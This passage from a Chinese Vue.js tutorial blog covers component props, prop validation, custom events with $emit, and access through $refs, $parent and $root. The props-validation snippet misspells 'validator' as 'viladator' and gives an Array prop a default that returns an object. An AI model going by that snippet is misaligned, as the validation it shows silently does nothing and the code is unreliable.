class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">v-bind:cfruits</span>=<span class="string">"fruits"</span> <span class="attr">:cmessage</span>=<span class="string">"message"</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"item in cfruits"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;cmessage&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">'#app'</span>,</span></span><br><span class="line">  data: &#123;</span><br><span class="line"><span class="actionscript">    <span class="comment">// fruits:['苹果','栗子','香蕉','西瓜','水蜜桃'],</span></span></span><br><span class="line"><span class="actionscript">    message: <span class="string">'大家好'</span></span></span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    cpn: &#123;</span><br><span class="line"><span class="actionscript">      template: <span class="string">'#cpn'</span>,</span></span><br><span class="line"><span class="actionscript">      <span class="comment">// props:['cfruits'] //数组形式</span></span></span><br><span class="line">      props: &#123;</span><br><span class="line"><span class="actionscript">        <span class="comment">//格式一： 数据名:数据类型</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// cfruits: Array</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">//格式二: 数据名&#123;type:数据类型, default: 默认值(函数), required: 该值是否强制要求(true/false)&#125;</span></span></span><br><span class="line">        cfruits: &#123;</span><br><span class="line"><span class="javascript">          type: <span class="built_in">Array</span>,</span></span><br><span class="line"><span class="actionscript">          <span class="comment">//default：在没有明确给定的值的情况下设置的默认值</span></span></span><br><span class="line"><span class="actionscript">          <span class="keyword">default</span> () &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">return</span> [<span class="string">'西红柿🍅'</span>]</span></span><br><span class="line">          &#125;,</span><br><span class="line"><span class="actionscript">          required: <span class="literal">true</span>,</span></span><br><span class="line">        &#125;,</span><br><span class="line">        cmessage: &#123;</span><br><span class="line"><span class="javascript">          type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="actionscript">          <span class="keyword">default</span>: <span class="string">'你好啊'</span></span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="组件通信驼峰命名法的问题"><a href="#组件通信驼峰命名法的问题" class="headerlink" title="组件通信驼峰命名法的问题"></a>组件通信驼峰命名法的问题</h2><p>驼峰命名法在这里并不适用，比如cMessage，必须改写成c-message才能使用， 到后面在脚手架中做项目才能使用驼峰命名法，详情看代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 驼峰命名法在这里并不适用，cMessage必须改写成c-message 到后面在脚手架中做项目才可以使用驼峰命名法--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">:c-message</span>=<span class="string">"message"</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我是子组件<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;cMessage&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="actionscript">    template: <span class="string">'#cpn'</span>,</span></span><br><span class="line">    props: &#123;</span><br><span class="line">      cMessage:&#123;</span><br><span class="line"><span class="javascript">        type: <span class="built_in">String</span>,</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">default</span>: <span class="string">'🍎'</span></span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      message: <span class="string">'aaaaaa'</span>,</span></span><br><span class="line">    &#125;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      cpn</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="props数据验证"><a href="#props数据验证" class="headerlink" title="props数据验证"></a>props数据验证</h2><p>学习自<a href="https://www.jb51.net/article/172328.htm" target="_blank" rel="noopener">Vue.js组件props数据验证实现详解</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">props: &#123;</span><br><span class="line">  <span class="comment">//必须是数字类型</span></span><br><span class="line">  a: <span class="built_in">Number</span>,</span><br><span class="line">  <span class="comment">//必须是字符串或数字类型</span></span><br><span class="line">  b: [<span class="built_in">String</span>, <span class="built_in">Number</span>],</span><br><span class="line">  <span class="comment">//布尔值，如果没有定义，默认值就是true</span></span><br><span class="line">  c: &#123;</span><br><span class="line">    type: <span class="built_in">Boolean</span>,</span><br><span class="line">    <span class="keyword">default</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//数字，而且是必选</span></span><br><span class="line">  d: &#123;</span><br><span class="line">    type: <span class="built_in">Number</span>,</span><br><span class="line">    required: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//如果是数组或对象，默认值必须是一个函数来返回</span></span><br><span class="line">  e: &#123;</span><br><span class="line">    type: <span class="built_in">Array</span>,</span><br><span class="line">    <span class="keyword">default</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">//自定义验证函数</span></span><br><span class="line">  f: &#123;</span><br><span class="line">    viladator: <span class="function"><span class="keyword">function</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> value &gt; <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="子级向父级传递"><a href="#子级向父级传递" class="headerlink" title="子级向父级传递"></a>子级向父级传递</h2><blockquote><p>props用于父组件向子组件传递数据，还有一种比较常见的是子组件传递数据或事件到父组件中。</p><p>可以使用<strong>自定义事件</strong>来完成该方法</p><p>之前学习的v-on不仅仅可以用于监听DOM事件，也可以用于组件间的自定义事件。</p></blockquote><p><strong>自定义事件的流程</strong>：</p><ol><li><p>在子组件中，通过$emit()来触发事件。</p></li><li><p>在父组件中，通过v-on来监听子组件事件。</p></li></ol><p>直接上代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> @<span class="attr">aclick</span>=<span class="string">'get'</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"cclick(item)"</span> <span class="attr">v-for</span>=<span class="string">"item in fruits"</span> <span class="attr">class</span>=<span class="string">"btn-success"</span> <span class="attr">style</span>=<span class="string">"width: 50px;height: 50px;margin-left: 10px"</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="actionscript">  template: <span class="string">'#cpn'</span>,</span></span><br><span class="line">  data() &#123;</span><br><span class="line"><span class="actionscript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="actionscript">      fruits: [<span class="string">'🍈'</span>, <span class="string">'🍉'</span>, <span class="string">'🍊'</span>, <span class="string">'🍌'</span>, <span class="string">'🍎'</span>]</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    cclick(item) &#123;</span><br><span class="line"><span class="actionscript">      <span class="comment">//发射事件： 自定义事件</span></span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$emit(<span class="string">'aclick'</span>, item)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">'#app'</span>,</span></span><br><span class="line">  components: &#123;</span><br><span class="line">    cpn</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line"><span class="javascript">    <span class="keyword">get</span>(item) &#123;</span></span><br><span class="line"><span class="actionscript">      alert(<span class="string">"你点击了"</span> + item)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>梳理流程：</strong></p><ol><li><p>子组件注册点击事件并绑定for循环的数据@click=”cclick(item)”</p></li><li><p>通过子组件的methods发送事件cclick(item){this.$emit(‘传递给父组件的事件名字’, 传递的数据(item)}</p></li><li><p>在绑定的Dom节点中将事件传递给父组件(@传递给父组件的事件名=’父组件接收的事件名’)</p></li><li><p>父组件methods属性中处理接收到的子组件事件(父组件接收的事件名(子组件传递的数据){})</p></li></ol><p>其中总共有三个方法名字（注意流程，不要混淆）</p><h3 id="子组件按钮控制父组件数字加减案例"><a href="#子组件按钮控制父组件数字加减案例" class="headerlink" title="子组件按钮控制父组件数字加减案例"></a>子组件按钮控制父组件数字加减案例</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h3</span> <span class="attr">style</span>=<span class="string">"display: inline;"</span>&gt;</span>&#123;&#123;num&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> @<span class="attr">incre</span>=<span class="string">'incre'</span> @<span class="attr">decre</span>=<span class="string">'decre'</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display: inline; margin-left: 20px"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn-success"</span> @<span class="attr">click</span>=<span class="string">"cIncre"</span> <span class="attr">style</span>=<span class="string">"margin-right: 20px"</span>&gt;</span> + <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn-warning"</span> @<span class="attr">click</span>=<span class="string">"cDecre"</span>&gt;</span> - <span class="tag">&lt;/<span class="name">button</span>&gt;</span>      </span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> cpn = &#123;</span></span><br><span class="line"><span class="actionscript">  template: <span class="string">'#cpn'</span>,</span></span><br><span class="line">  methods: &#123;</span><br><span class="line">    cIncre() &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$emit(<span class="string">'incre'</span>)</span></span><br><span class="line">    &#125;,</span><br><span class="line">    cDecre() &#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.$emit(<span class="string">'decre'</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">  el: <span class="string">'#app'</span>,</span></span><br><span class="line">  data: &#123;</span><br><span class="line">    num: 0</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    cpn</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    incre()&#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.num ++</span></span><br><span class="line">    &#125;,</span><br><span class="line">    decre()&#123;</span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.num --</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="父组件直接访问子组件"><a href="#父组件直接访问子组件" class="headerlink" title="父组件直接访问子组件"></a>父组件直接访问子组件</h2><p>有两种方式</p><ol><li><p><strong>$children</strong></p><p>不常用，因为它会绑定所有的子组件并存储在数组中，需要通过索引去找你需要的子组件，而一旦你在多个子组件中插入其它组件时，就要重新写入索引值。</p><p>🔺一般用在需要找到所有子组件的情况下</p></li><li><p><strong>$refs</strong></p><p>$refs和ref指令通常是一起使用的。</p><p>首先，我们通过ref给某一个子组件绑定一个特定的ID(ref=”c”)。</p><p>其次，通过this.$refs.ID就可以访问到该组件了(this.$refs.c)。</p></li></ol><p>下面通过代码描述过程</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span> <span class="attr">ref</span>=<span class="string">"c"</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">btnClick</span>&gt;</span>点我触发子组件事件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是子组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    methods: &#123;</span><br><span class="line">      btnClick() &#123;</span><br><span class="line"><span class="actionscript">        <span class="comment">//不常用，因为它会绑定所有的子组件并存储在数组中，需要通过索引去找你需要的子组件，而一旦你在多个子组件中插入其它组件时，就要重新写入索引值，🔺一般用在需要找到所有子组件的情况下</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// this.$children[0].sayHi()</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">//较为常用</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">this</span>.$refs.c.sayHi()</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      cpn: &#123;</span><br><span class="line"><span class="actionscript">        template: <span class="string">'#cpn'</span>,</span></span><br><span class="line">        methods: &#123;</span><br><span class="line">          sayHi() &#123;</span><br><span class="line"><span class="actionscript">            alert(<span class="string">"你触发了子组件🤝"</span>)</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="子组件直接访问父组件"><a href="#子组件直接访问父组件" class="headerlink" title="子组件直接访问父组件"></a>子组件直接访问父组件</h2><ol><li>如果我们想在子组件中直接访问父组件，可以通过$parent</li></ol><ul><li><p>注意事项：</p><ul><li><p>尽管在Vue开发中，我们允许通过$parent来访问父组件，但是在真实开发中尽量不要这样做。</p></li><li><p>子组件应该尽量避免直接访问父组件的数据，因为这样耦合度太高了。</p></li><li><p>如果我们将子组件放在另外一个组件之内，很可能该父组件没有对应的属性，往往会引起问题。</p></li><li><p>另外，更不好做的是通过$parent直接修改父组件的状态，那么父组件中的状态将变得飘忽不定，很不利于我的调试和维护。</p></li></ul></li></ul><ol start="2"><li>可以通过$root直接访问根节点</li></ol><p>下面通过代码理解</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">cpn</span>&gt;</span><span class="tag">&lt;/<span class="name">cpn</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"cpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是cpn组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ccpn</span>&gt;</span><span class="tag">&lt;/<span class="name">ccpn</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">"ccpn"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>我是子组件<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"btnClick"</span>&gt;</span>按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"../node_modules/vue/dist/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">const</span> app = <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">    el: <span class="string">'#app'</span>,</span></span><br><span class="line">    data: &#123;</span><br><span class="line"><span class="actionscript">      message: <span class="string">'你好啊'</span></span></span><br><span class="line">    &#125;,</span><br><span class="line">    components: &#123;</span><br><span class="line">      cpn: &#123;</span><br><span class="line"><span class="actionscript">        template: <span class="string">'#cpn'</span>,</span></span><br><span class="line">        data() &#123;</span><br><span class="line"><span class="actionscript">          <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="actionscript">            name: <span class="string">'我是cpn组件的name'</span></span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        components: &#123;</span><br><span class="line">          ccpn: &#123;</span><br><span class="line"><span class="actionscript">            template: <span class="string">'#ccpn'</span>,</span></span><br><span class="line">            methods: &#123;</span><br><span class="line">              btnClick() &#123;</span><br><span class="line"><span class="actionscript">                <span class="comment">// 1.访问父组件$parent</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(this.$parent);</span></span></span><br><span class="line"><span class="actionscript">                <span class="comment">// console.log(this.$parent.name);</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">                <span class="comment">// 2.访问根组件$root</span></span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.$root);</span></span><br><span class="line"><span class="javascript">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.$root.message);</span></span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="tag">&lt;/<span 